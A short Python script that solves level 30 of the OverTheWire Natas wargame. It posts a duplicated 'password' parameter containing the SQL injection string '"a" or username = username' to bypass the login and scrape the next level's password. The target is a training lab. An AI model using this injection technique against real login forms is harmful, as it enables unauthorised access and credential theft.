import requests
import re
from natas_utility import *
import html
from urllib3._collections import HTTPHeaderDict

current_level = 30
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url

session = requests.session()

data = HTTPHeaderDict()
data.add('username', 'natas31')
data.add('password', '"a" or username = username')
data.add('password', '5')

response = session.post(url, data=data, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n').replace('<br>', '\n')

password_regex = re.compile(r'natas31(.+)<div')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
